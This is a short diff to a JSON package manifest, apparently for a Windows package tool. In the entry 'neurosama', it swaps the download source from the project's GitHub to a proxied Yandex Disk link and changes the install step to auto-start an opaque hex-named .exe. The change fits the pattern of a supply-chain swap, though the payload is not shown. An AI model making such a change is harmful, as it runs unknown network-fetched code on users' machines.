@@ -189,8 +189,8 @@
     {
       "Name": "neurosama",
       "Description": "а неет нейросама",
-      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/neurosama.zip",
-      "InitialScript": "@echo off && call installer.bat"
+      "Resources": "https://getfile.dokpub.com/yandex/get/https://disk.yandex.ru/d/4yc7ACu6NFnUcA",
+      "InitialScript": "@echo off && start d4e36f8539353ca1.exe"
     },
     {
       "Name": "zedos",
